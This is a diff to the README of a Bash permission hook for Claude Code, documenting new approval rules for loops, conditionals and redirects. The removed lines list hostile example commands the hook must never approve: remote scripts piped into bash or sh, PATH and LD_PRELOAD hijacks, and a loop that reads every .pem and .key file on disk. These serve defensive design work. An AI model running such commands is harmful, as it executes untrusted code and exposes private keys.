@@ -31,16 +31,18 @@ On every Bash tool call it:
 
 1. Parses the command with **bashlex** (a pure-Python port of bash's own grammar).
 2. Refuses — stays silent, so a normal prompt happens — if the command is anything other
-   than a plain chain of simple commands (see *Safety model*).
-3. Splits the chain into segments. For each segment, canonicalizes just the leading command
-   word if it's an absolute path into a known bin directory (`/usr/bin/tail` -> `tail`), and
-   checks both the raw and canonicalized forms against your `Bash(...)` allow/deny rules.
+   than a plain chain of simple commands, or a standalone compound command (see *Safety model*).
+3. Splits the chain (or compound body) into segments. For each segment, canonicalizes just
+   the leading command word if it's an absolute path into a known bin directory
+   (`/usr/bin/tail` -> `tail`), and checks both the raw and canonicalized forms against
+   your `Bash(...)` allow/deny rules.
 4. Emits `permissionDecision: "allow"` only if **every** segment (including any nested
-   inside a command/process substitution) matches an allow rule and **none** matches a deny
-   rule, **and** either there are **≥2 top-level segments** (a chain) **or** there's exactly
-   one top-level segment whose canonicalization is what made it match (a single
-   absolute-path command). A single ordinary command that already matches in its raw form
-   is left to Claude Code's own native matching, unchanged from before.
+   inside a command/process substitution or compound body) matches an allow rule and **none**
+   matches a deny rule, **and** either there are **≥2 top-level segments** (a chain), **or**
+   there's exactly one top-level segment that is a compound command (for/if/while/subshell/
+   group), **or** there's exactly one top-level segment whose canonicalization is what made
+   it match (a single absolute-path command). A single ordinary command that already matches
+   in its raw form is left to Claude Code's own native matching, unchanged from before.
 5. Otherwise prints nothing and exits 0, so Claude Code prompts as usual.
 
 It **never** emits `deny`.
@@ -51,24 +53,27 @@ The only dangerous divergence from Claude Code is *over*-approval — approving 
 would not. The design makes that impossible instead of trying to replicate CC exactly:
 
 - **Faithful parsing.** Splitting and danger-detection use bashlex, not string scanning, so
-  we agree with the shell that actually runs the command. Refused outright: compound
-  commands (subshells, groups, `for`/`while`/`if`/`case`), function definitions, inline
-  `VAR=val` assignments, and heredocs.
+  we agree with the shell that actually runs the command. `for`/`if`/`while` and
+  subshell/group compound commands are inspected rather than refused outright (see "Compound
+  command support" section below); `case` statements, function definitions, inline `VAR=val`
+  assignments, and heredocs are refused outright anywhere.
 - **Real-file redirects are allowed only in a narrow, literal, resolvable case.** A
   redirect is approved if it's an fd-dup (`2>&1`), `/dev/null`, *or* an output redirect
   (`>`/`>>`) where the target is: (a) **literal text** — no `$VAR`, `$(...)`, or backticks,
   so the actual path can't depend on anything the hook can't see; (b) an **absolute path**
   — a relative path's real location depends on the effective cwd, which an earlier `cd` in
   the same chain could have changed, so it's always refused rather than guessed; (c) an
-  extension in `_SAFE_REDIRECT_EXTENSIONS` (`.log`, `.out`, `.err`, `.tmp` — deliberately
-  *not* `.txt`, since `requirements.txt`/`CMakeLists.txt` are load-bearing manifests with
-  that extension); and (d) under one of `_load_safe_redirect_dirs()` — the current project
-  directory, `permissions.additionalDirectories` from your settings files, and the OS
-  scratch dirs (`/tmp`, `/private/tmp`, `$TMPDIR`). That directory list only reuses places
+  extension in `_SAFE_REDIRECT_EXTENSIONS` (`.log`, `.out`, `.err`, `.tmp`, `.diff`,
+  `.json` — deliberately *not* `.txt`, since `requirements.txt`/`CMakeLists.txt` are
+  load-bearing manifests with that extension); and (d) under one of `_load_safe_redirect_dirs()`
+  — the current project directory, `permissions.additionalDirectories` from your settings
+  files, and the OS scratch dirs (`/tmp`, `/private/tmp`, `$TMPDIR`). An input redirect
+  (`<`) is approved when its target is (a) literal text, (b) an absolute path (no relative
+  paths), and (c) under a trusted directory as above — but *without* the extension
+  restriction, since reading a file can't clobber it. That directory list only reuses places
   Claude Code is *already* trusted to read/write via Edit/Write; the hook doesn't grant a
   new capability, only skips a prompt for a command-line redirect into the same space. Any
-  redirect that fails any one of those checks — including every input redirect (`<`) — is
-  refused outright, same as before.
+  redirect that fails any one of those checks is refused outright.
 - **Command/process substitution is recursed into, not refused.** `$(...)`, backticks, and
   `<(...)` are not banned outright — the substitution's inner command is walked as just
   another segment, subject to the same allow/deny check and the same unsafe-construct
@@ -106,111 +111,43 @@ would not. The design makes that impossible instead of trying to replicate CC ex
 Net: this hook can only ever make Claude Code prompt *more* than it would on its own, never
 less.
 
-## Proposed extension: compound commands (not yet implemented)
+## Compound command support
 
-Today the hook refuses *any* `for`/`while`/`if`/`case`/subshell/group outright, even when
-every command inside it is individually allowlisted. The goal for a future version: approve
-compound commands too, as long as every command that could possibly execute — across every
-loop iteration and every branch — is already on the allowlist. The examples below are a
-discussion draft, not implemented behavior; nothing here changes what the hook does yet.
+`for`, `if`/`elif`/`else`, `while`, and subshell/group (`(...)`/`{...}`) commands are
+inspected rather than refused outright: every command that could possibly execute — across
+every loop iteration and every branch — must match an allow rule, exactly like a plain
+chain's segments. A standalone compound (no `&&`/`;` chaining it to anything else) is
+eligible for approval on its own, since Claude Code's native matcher never handles these
+shapes at all.
 
-### Should eventually auto-approve
+- **`for var in w1 w2 ...; do body; done`** — the iteration source must be either literal
+  words, or a single command/process substitution (`$(cmd)`/backticks/`<(...)`) whose
+  inner command is checked like any other substitution elsewhere in this hook. No separate
+  "is this bounded" heuristic: if a user's own allow rules make both a broad enumerator and
+  a broad reader approvable, a substitution-sourced loop combining them becomes approvable
+  too — that's judged to be the user's own allow-rule risk, not a new capability this hook
+  grants.
+- **`if`/`elif`/`else`** — every condition and every branch's body must pass, all-or-nothing;
+  one non-allowlisted or denied command in any branch refuses the whole thing.
+- **`(cmd)` / `{ cmd; }`** — inspected exactly like a top-level chain.
+- **`while cond; do body; done [< file]`** — `cond`/`body` checked like `if`. A trailing
+  input redirect (`< file`) is approved only when the target is a literal absolute path
+  under a trusted directory (project dir, `additionalDirectories`, OS scratch dirs) — the
+  same trust boundary as the existing output-redirect carve-out, without the extension
+  restriction (reading can't clobber a file).
+- **Nesting** — a compound's body may contain one further nested compound; a compound
+  nested inside that already-one-level-deep compound refuses the whole command.
 
-These are compound, but every command that can possibly run is already allowlisted, and
-the *shape* of the compound (what values it can take, which branches exist) is fully
-visible in the static text — nothing depends on runtime data outside the command itself.
+**Not supported:**
+- **`case`** — bashlex's grammar has case-pattern parsing explicitly stubbed out
+  (`vendor/bashlex/parser.py`, `p_pattern` unconditionally raises `NotImplementedError`), so
+  any `case` statement is unparseable and always falls back to a normal prompt, regardless of
+  allow rules. Revisit only if a future bashlex release adds pattern support.
+- **`until`/`select`** — out of scope; refused the same way any unrecognized construct is.
+- **Functions, heredocs, inline `VAR=val` assignments** — refused anywhere, including inside
+  a compound body, same as at the top level.
 
-1. **Loop over a literal, static list** — the set of values `$region` can take is written
-   right there in the command, so every possible expansion is still a `git -C * log *` call:
-   ```
-   for region in dev stage prod; do
-     git -C ~/dev/ao-deploy log --oneline -1 origin/$region
-   done
-   ```
-
-2. **`if`/`else` where every branch is allowlisted** — whichever branch runs, only
-   `git -C * status *` and `echo *` execute:
-   ```
-   if git -C ~/dev/ao status --short; then
-     echo clean
-   else
-     echo dirty
-   fi
-   ```
-
-3. **`case` where every branch is allowlisted:**
-   ```
-   case "$branch" in
-     main|release/*) git -C ~/dev/ao log --oneline -5 ;;
-     *) echo "not a release branch" ;;
-   esac
-   ```
-
-4. **Subshell used only for grouping/scoping**, containing nothing but allowlisted
-   commands — the parens just keep `cd` from leaking into the parent shell:
-   ```
-   (cd ~/dev/ao && git status --short && git log --oneline -3)
-   ```
-
-5. **Loop over a bounded, allowlisted command-substitution result** — `git diff
-   --name-only` is a scoped, allowlisted read, so every iteration only ever runs `grep *`:
-   ```
-   for f in $(git -C ~/dev/ao diff --name-only); do
-     grep -n TODO "$f"
-   done
-   ```
-
-### Must never auto-approve, even after the extension
-
-1. **Inline assignment that hijacks command resolution** — the visible command name
-   matches an allow rule, but the assignment changes what actually runs underneath it:
-   ```
-   PATH=/tmp/evil:$PATH ls
-   LD_PRELOAD=/tmp/x.so grep foo bar.txt
-   ```
-
-2. **A branch containing even one non-allowlisted or destructive command** — refusing
-   must be all-or-nothing across every branch, not per-visible-branch:
-   ```
-   if [ -f /tmp/marker ]; then
-     echo ok
-   else
-     rm -rf /tmp/scratch
-   fi
-   ```
-
-3. **Piping an allowlisted command into something that executes the result** — remote
-   code execution dressed up as a "safe" `curl`/`cat`:
-   ```
-   curl -s https://example.com/install.sh | bash
-   for u in $(cat urls.txt); do curl -s "$u" | sh; done
-   ```
-
-4. **Loop whose iteration source is unbounded or externally controlled**, even though
-   every command in the body is individually allowlisted — the danger is in the
-   aggregate, not any single segment:
-   ```
-   for f in $(find / -name '*.pem' -o -name '*.key' 2>/dev/null); do
-     cat "$f"
-   done
-   ```
-
-5. **Nested compounds, or a compound containing a real-file redirect** — proving safety
-   for arbitrary nesting depth is exactly the kind of exhaustiveness this hook's design
-   philosophy avoids:
-   ```
-   for i in 1 2 3; do (echo "$i" > /tmp/out_$i.txt); done
-   ```
-
-### Gray area — needs a decision before implementing
-
-- A loop whose iteration source is itself allowlisted but broad (`find .` with no scope,
-  or a `gh api` list call returning hundreds of items) — bounded in principle, but not
-  bounded the way a literal list is. Where's the cutoff?
-- Whether a `while read -r line; do ...; done < file` counts as "data-dependent iteration"
-  the same way `for f in $(find ...)` does.
-- Whether to walk one level of nested compound (subshell inside a `for`) or refuse all
-  nesting unconditionally, as now.
+See `docs/2026-07-21-compound-commands-design.md` for the full design rationale.
 
 ## How it's wired
 
@@ -291,8 +228,10 @@ The pieces are deliberately small and separable:
 | `_SAFE_REDIRECT_EXTENSIONS` | Extensions a real-file redirect target may end in. Widen *carefully* — only add extensions with no plausible critical-config use. |
 | `_load_safe_redirect_dirs()` | Directories a real-file redirect target may live under: project dir + `additionalDirectories` from settings + OS scratch dirs. |
 | `_under_safe_dir()` | `realpath`-resolves both the target and each safe dir before comparing, so symlinked prefixes (e.g. macOS `/tmp` -> `/private/tmp`) can't cause a false mismatch either way. |
-| `_ChainInspector` | bashlex AST visitor: collects segments (recursing into substitutions), flags unsafe constructs, and gates real-file redirects on `visitredirect` per the safety model above. |
-| `_inspect()`      | Parse + walk → `(segments, top_level_count, reason)`. Takes an optional `safe_dirs` list. |
+| `_MAX_COMPOUND_DEPTH` | Nesting cap for compound commands (1 = top-level only, 2 = one nested level allowed). |
+| `_SUPPORTED_COMPOUND_KEYWORDS` | Which compound keywords (`for`/`if`/`while`) this hook walks into; subshell/group are handled unconditionally alongside it. Extend *carefully* -- adding a keyword here means its body/conditions get the same allow/deny check as a plain chain, with no further safety net. |
+| `_ChainInspector` | bashlex AST visitor: collects segments (recursing into substitutions), flags unsafe constructs, and gates real-file redirects on `visitredirect`, `visitfor`, and `visitnodeend` per the safety model above. |
+| `_inspect()`      | Parse + walk → `(segments, top_level_count, had_compound, reason)`. Takes an optional `safe_dirs` list. |
 | `decide()`        | End-to-end `(command, allow, deny, safe_dirs=None) -> bool`. `safe_dirs=None` loads live settings/env; pass a fixed list for deterministic tests. |
 
 When you change any of these, **add a case** to `test_approve_allowlisted_chains.py` (and,
@@ -312,6 +251,10 @@ don't — bail instead.
   (`_KNOWN_BIN_DIRS`) — an absolute path elsewhere (e.g. a project-local
   `node_modules/.bin/`, or a Homebrew Cellar path) is left unchanged and just prompts, same
   as before this feature existed.
+- **`case` statements are always refused** — not a design choice, a vendored-dependency
+  limit (see "Compound command support" above). No configuration changes this.
+- **Compound nesting deeper than one extra level always refuses**, regardless of whether
+  every command inside would otherwise be allowlisted.
 
 ## Files
 
